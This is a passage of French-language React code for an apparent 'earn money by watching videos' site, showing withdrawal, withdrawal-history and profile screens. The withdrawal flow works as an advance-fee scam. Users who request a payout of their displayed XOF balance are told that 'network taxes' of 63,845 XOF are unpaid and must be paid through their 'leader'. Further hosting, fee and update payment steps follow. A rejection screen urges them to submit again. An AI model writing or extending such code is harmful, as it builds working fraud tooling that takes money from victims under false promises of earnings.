  if (latestRequest && !dismissedLatest && latestRequest.status === 'rejected') return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-red-400/30 bg-[#241318] p-8 text-center shadow-2xl sm:p-12"><XCircle className="mx-auto h-12 w-12 text-red-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre retrait a échoué</h1><p className="mt-4 leading-7 text-slate-300">Veuillez réessayer avec une nouvelle demande de retrait.</p><p className="mt-3 text-sm text-slate-400">Aucun montant n’a quitté votre compte : votre solde reste disponible pour une nouvelle demande.</p><button onClick={() => { setDismissedLatest(true); setLatestRequest(null); setCodeStep(false); setCertificationBlocked(false); setHostingStep(false); setHostingPaid(false); setHostedSuccess(false); setFeeStep(false); setFeePaid(false); setUpdateStep(false); setUpdatePaid(false); setHostingContinued(false); setWithdrawalProcessing(false); try { window.localStorage.removeItem(flowKey); } catch { /* stockage indisponible */ } }} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Faire une nouvelle demande</button></div></section>;

  if (latestRequest && !dismissedLatest && latestRequest.status === 'approved') return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-green-400/30 bg-[#12241a] p-8 text-center shadow-2xl sm:p-12"><CheckCircle2 className="mx-auto h-12 w-12 text-green-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre retrait a été effectué avec succès</h1><p className="mt-4 leading-7 text-slate-300">Votre demande de <b>{latestRequest.amount.toLocaleString('fr-FR')} XOF</b> a été validée.</p><button onClick={() => setDismissedLatest(true)} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Retour au retrait</button></div></section>;

  const numericAmount = Number(amount);
  const canSubmit = balanceReady && !submitting && paymentMethod !== '' && withdrawalCountry !== '' && phone.trim() !== '' && numericAmount > 0 && numericAmount <= availableBalance;
  return <section className="py-9 sm:py-14"><div className="mx-auto max-w-3xl rounded-[30px] border border-blue-400/40 bg-[linear-gradient(145deg,#192c49,#102329)] px-5 py-8 text-center shadow-[0_20px_55px_rgba(24,87,120,.18)] sm:px-10"><p className="text-sm font-bold uppercase tracking-[.28em] text-blue-400">Solde disponible</p><p className="mt-5 text-5xl font-black tracking-tight text-white sm:text-7xl">{availableBalance.toLocaleString('fr-FR')} XOF</p><p className="mt-5 text-base text-slate-500 sm:text-lg"><b>{counts.rewarded}</b> vidéo(s) regardée(s), aimée(s) et ajoutée(s) aux favoris</p>{committedAmount > 0 && <p className="mt-3 text-sm font-semibold text-amber-200">{committedAmount.toLocaleString('fr-FR')} XOF sont déjà réservés par une demande en attente ou approuvée.</p>}</div><div className="mx-auto mt-8 max-w-3xl rounded-[30px] border border-slate-400/20 bg-[#242c40] p-5 shadow-2xl sm:p-10"><h1 className="sr-only">Retrait</h1>{codeStep ? <div className="text-center"><h2 className="text-2xl font-black text-white">Vous n'aviez pas encore payé les taxes de réseau afin que votre demande de retrait soit validée.</h2>{!codeReady ? <div className="py-12"><Loader2 className="mx-auto h-10 w-10 animate-spin text-blue-400" /><p className="mt-5 text-slate-300">Préparation de la confirmation…</p></div> : <div className="mt-8 text-left"><p className="mb-6 text-sm leading-6 text-slate-300">Veuillez contacter votre leader pour payer les taxes de réseau : <b>63 845 XOF</b>.</p><WithdrawalField label="Code de retrait"><input type="text" autoComplete="one-time-code" value={withdrawalCode} onChange={(event) => setWithdrawalCode(event.target.value)} placeholder="Saisissez votre code" className="withdrawal-input" /></WithdrawalField>{errorMessage && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{errorMessage}</p>}<button onClick={proceedToHosting} disabled={submitting || !withdrawalCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">{submitting ? 'Vérification en cours…' : 'Confirmer le retrait'}</button></div>}</div> : <><WithdrawalField label="Moyen de paiement"><select value={paymentMethod} onChange={(event) => setPaymentMethod(event.target.value)} className="withdrawal-input"><option value="">-- Choisir un moyen de paiement --</option>{paymentMethods.map((method) => <option key={method}>{method}</option>)}</select></WithdrawalField><WithdrawalField label="Nom complet du bénéficiaire"><input value={beneficiary} readOnly className="withdrawal-input" /></WithdrawalField><div className="grid gap-5 sm:grid-cols-2"><WithdrawalField label="Pays"><select value={withdrawalCountry} onChange={(event) => { setWithdrawalCountry(event.target.value); setPaymentMethod(''); }} className="withdrawal-input"><option value="">-- Choisir un pays --</option>{countries.map((country) => <option key={country.name} value={country.name}>{country.name}</option>)}</select></WithdrawalField><WithdrawalField label="Ville"><input value={profile.city ?? '—'} readOnly className="withdrawal-input" /></WithdrawalField></div><WithdrawalField label="Numéro de compte Mobile Money"><div className="flex overflow-hidden rounded-2xl bg-[#0b0f16]"><span className="flex items-center border-r border-white/10 px-4 text-lg text-slate-400">{dialCode}</span><input type="tel" inputMode="numeric" value={phone} onChange={(event) => setPhone(event.target.value)} placeholder="77 000 00 00" className="withdrawal-input rounded-none bg-transparent" /></div></WithdrawalField><WithdrawalField label="Montant à retirer"><input type="number" min="1" value={amount} onChange={(event) => setAmount(event.target.value)} placeholder={`Ex : ${availableBalance.toLocaleString('fr-FR')}`} className="withdrawal-input" /></WithdrawalField>{errorMessage && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{errorMessage}</p>}<button onClick={beginSubmit} disabled={!canSubmit} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Continuer vers la confirmation</button></>}</div></section>;
}

function CertifiedBadge() { return <img src="/assets/icons/file_00000000f4308210a788b98916b52e8e.png" alt="Compte certifié" className="inline-block h-5 w-5 object-contain align-middle" />; }

interface WithdrawalHistoryRow { amount: number; status: string; created_at: string; }

function HistoryTab({ profileId }: { profileId: string }) {
  const [rows, setRows] = useState<WithdrawalHistoryRow[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let mounted = true;
    const fetchHistory = async () => {
      const { data, error: fetchError } = await supabase.from('withdrawal_requests').select('amount, status, created_at').eq('user_id', profileId).order('created_at', { ascending: false });
      if (!mounted) return;
      if (fetchError) { setError('L’historique n’est pas disponible pour le moment.'); setLoading(false); return; }
      setRows((data ?? []).map((row) => ({ amount: Number(row.amount), status: String(row.status), created_at: String(row.created_at) })));
      setError(null);
      setLoading(false);
    };
    void fetchHistory();
    const timer = window.setInterval(fetchHistory, 5000);
    return () => { mounted = false; window.clearInterval(timer); };
  }, [profileId]);

  const statusLabel: Record<string, { label: string; className: string; icon: typeof Clock3 }> = {
    pending: { label: 'En attente de validation', className: 'border-amber-400/30 bg-amber-500/10 text-amber-200', icon: Clock3 },
    approved: { label: 'Validé', className: 'border-green-400/30 bg-green-500/10 text-green-300', icon: CheckCircle2 },
    rejected: { label: 'Rejeté', className: 'border-red-400/30 bg-red-500/10 text-red-300', icon: XCircle },
  };

  return <section className="mx-auto max-w-3xl py-12 sm:py-16"><p className="text-sm font-bold uppercase tracking-[.2em] text-blue-300">Mes retraits</p><h1 className="mt-3 text-4xl font-black text-white">Historique</h1><p className="mt-3 text-slate-400">La liste de tous vos retraits et leur statut de validation.</p>{loading ? <div className="mt-10 py-12 text-center"><Loader2 className="mx-auto h-10 w-10 animate-spin text-blue-400" /><p className="mt-5 text-slate-300">Chargement de vos retraits…</p></div> : error ? <p className="mt-10 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{error}</p> : rows.length === 0 ? <div className="mt-10 rounded-3xl border border-white/10 bg-[#141a24] px-6 py-14 text-center"><Banknote className="mx-auto h-12 w-12 text-slate-500" /><p className="mt-5 font-bold text-white">Aucun retrait pour le moment</p><p className="mt-2 text-sm text-slate-400">Vos retraits apparaîtront ici une fois effectués.</p></div> : <div className="mt-8 overflow-hidden rounded-3xl border border-white/10 bg-[#141a24]">{rows.map((row, index) => { const status = statusLabel[row.status] ?? { label: row.status, className: 'border-white/10 bg-white/5 text-slate-300', icon: Clock3 }; const StatusIcon = status.icon; const date = new Date(row.created_at).toLocaleDateString('fr-FR', { day: '2-digit', month: 'long', year: 'numeric' }); const time = new Date(row.created_at).toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' }); return <div key={`${row.created_at}-${index}`} className="flex flex-col gap-3 border-b border-white/10 px-5 py-5 last:border-0 sm:flex-row sm:items-center sm:justify-between sm:px-7"><div className="flex items-center gap-4"><span className="flex h-11 w-11 items-center justify-center rounded-2xl bg-[#0b0f16]"><Banknote className="h-5 w-5 text-blue-300" /></span><div><p className="text-lg font-black text-white">{row.amount.toLocaleString('fr-FR')} XOF</p><p className="mt-0.5 text-sm text-slate-400">{date} à {time}</p></div></div><span className={`inline-flex w-fit items-center gap-2 rounded-full border px-3 py-1.5 text-xs font-bold ${status.className}`}><StatusIcon className="h-4 w-4" /> {status.label}</span></div>; })}</div>}</section>;
}

function StatCard({ label, value }: { label: string; value: number }) { return <div className="rounded-2xl border border-white/10 bg-[#141a24] p-5"><p className="text-sm leading-6 text-slate-400">{label}</p><p className="mt-2 text-4xl font-black text-white">{value}</p></div>; }
function WithdrawalField({ label, children }: { label: string; children: ReactNode }) { return <label className="mb-6 block"><span className="mb-3 block text-sm font-bold uppercase tracking-[.1em] text-slate-300">{label}</span>{children}</label>; }
function ProfileTab({ profile, counts }: { profile: UserHomeProfile; counts: { watched: number; liked: number; favorited: number; rewarded: number } }) { const identifier = `ID-${profile.id.split('-').join('').slice(0, 15).toUpperCase()}`; const details = [['Numéro d’identification', identifier], ['Prénom', profile.first_name], ['Nom', profile.last_name], ['Adresse e-mail', profile.email ?? '—'], ['Téléphone', profile.phone ?? '—'], ['Pays', profile.country ?? '—'], ['Ville', profile.city ?? '—'], ['Date de naissance', profile.birth_date ?? '—'], ['Genre', profile.gender ?? '—']]; return <section className="mx-auto max-w-3xl py-12 sm:py-16"><p className="text-sm font-bold uppercase tracking-[.2em] text-blue-300">Mon compte</p><h1 className="mt-3 text-4xl font-black text-white">Profil</h1><p className="mt-3 flex items-center gap-2 text-xl font-bold text-white">{profile.first_name} {profile.last_name}{profile.is_certified && <CertifiedBadge />}</p><p className="mt-3 text-slate-400">Vos informations personnelles</p><div className="mt-8 grid gap-4 sm:grid-cols-4"><StatCard label="Vidéos regardées" value={counts.watched} /><StatCard label="Vidéos aimées" value={counts.liked} /><StatCard label="Favoris" value={counts.favorited} /><StatCard label="Récompenses validées" value={counts.rewarded} /></div><div className="mt-8 overflow-hidden rounded-3xl border border-white/10 bg-[#141a24]">{details.map(([label, value]) => <div key={label} className="flex flex-col gap-1 border-b border-white/10 px-5 py-4 last:border-0 sm:flex-row sm:items-center sm:justify-between sm:px-7"><span className="text-slate-400">{label}</span><span className="break-all font-semibold text-white sm:text-right">{value}</span></div>)}</div></section>; }
